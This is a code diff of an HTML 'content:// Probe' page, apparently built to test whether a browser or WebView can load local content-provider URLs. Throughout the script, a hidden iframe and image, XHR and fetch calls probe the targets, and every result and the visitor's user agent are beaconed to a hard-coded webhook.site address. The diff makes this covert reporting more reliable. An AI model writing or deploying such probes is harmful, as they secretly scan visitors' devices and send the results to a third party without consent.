@@ -2,10 +2,10 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Advanced content:// Probe</title>
+<title>Fixed Probe</title>
 </head>
 <body>
-<h3>Advanced Probe Running...</h3>
+<h3>Probe Running (Fixed)...</h3>
 
 <script>
 const CONFIG = {
@@ -14,16 +14,23 @@ const CONFIG = {
     WEBHOOK: "https://webhook.site/893cc168-9c2c-409a-9c79-771f7d62bf3d"
 };
 
+// 🔥 FIX: gunakan image beacon (lebih reliable)
 function report(data) {
+    const payload = btoa(JSON.stringify({
+        time: Date.now(),
+        ua: navigator.userAgent,
+        ...data
+    }));
+
+    const img = new Image();
+    img.src = CONFIG.WEBHOOK + "?d=" + payload;
+
+    // fallback fetch (optional)
     fetch(CONFIG.WEBHOOK, {
         method: "POST",
         mode: "no-cors",
-        body: JSON.stringify({
-            time: Date.now(),
-            ua: navigator.userAgent,
-            ...data
-        })
-    });
+        body: payload
+    }).catch(()=>{});
 }
 
 // ========== XHR ==========
@@ -32,23 +39,20 @@ function testXHR(url, label) {
     const xhr = new XMLHttpRequest();
 
     xhr.open("GET", url, true);
-    xhr.responseType = "blob";
 
     xhr.onloadend = function() {
         report({
             type: "XHR",
             label,
-            url,
             status: xhr.status,
-            duration: performance.now() - start,
-            size: xhr.response ? xhr.response.size : 0
+            duration: performance.now() - start
         });
     };
 
-    xhr.onerror = e => report({ type: "XHR_ERROR", label, error: e.toString() });
+    xhr.onerror = () => report({ type: "XHR_ERROR", label });
 
     try { xhr.send(); }
-    catch(e) { report({ type: "XHR_EXCEPTION", label, error: e.toString() }); }
+    catch(e) { report({ type: "XHR_EXCEPTION", label }); }
 }
 
 // ========== FETCH ==========
@@ -57,16 +61,12 @@ async function testFetch(url, label) {
     try {
         await fetch(url, { mode: "no-cors" });
         report({
-            type: "FETCH",
+            type: "FETCH_DONE",
             label,
             duration: performance.now() - start
         });
     } catch (e) {
-        report({
-            type: "FETCH_ERROR",
-            label,
-            error: e.toString()
-        });
+        report({ type: "FETCH_ERROR", label });
     }
 }
 
@@ -75,17 +75,17 @@ function testIframe(url, label) {
     const iframe = document.createElement("iframe");
     iframe.style.display = "none";
 
-    let loaded = false;
+    let triggered = false;
 
     iframe.onload = () => {
-        loaded = true;
+        triggered = true;
         report({ type: "IFRAME_LOAD", label });
     };
 
-    iframe.onerror = () => report({ type: "IFRAME_ERROR", label });
-
     setTimeout(() => {
-        if (!loaded) report({ type: "IFRAME_TIMEOUT", label });
+        if (!triggered) {
+            report({ type: "IFRAME_TIMEOUT", label });
+        }
     }, 3000);
 
     iframe.src = url;
@@ -102,28 +102,6 @@ function testImage(url, label) {
     img.src = url;
 }
 
-// ========== WINDOW ==========
-function testWindow(url, label) {
-    const start = performance.now();
-    try {
-        const w = window.open(url, "_blank");
-        setTimeout(() => {
-            report({
-                type: "WINDOW",
-                label,
-                opened: !!w,
-                duration: performance.now() - start
-            });
-        }, 1000);
-    } catch (e) {
-        report({
-            type: "WINDOW_ERROR",
-            label,
-            error: e.toString()
-        });
-    }
-}
-
 // ========== RUN ==========
 window.onload = () => {
     const tests = [
@@ -132,11 +110,10 @@ window.onload = () => {
     ];
 
     tests.forEach(([url, label]) => {
-        testXHR(url, label);
-        testFetch(url, label);
-        testIframe(url, label);
-        testImage(url, label);
-        testWindow(url, label);
+        setTimeout(() => testXHR(url, label), 100);
+        setTimeout(() => testFetch(url, label), 300);
+        setTimeout(() => testIframe(url, label), 600);
+        setTimeout(() => testImage(url, label), 900);
     });
 };
 </script>
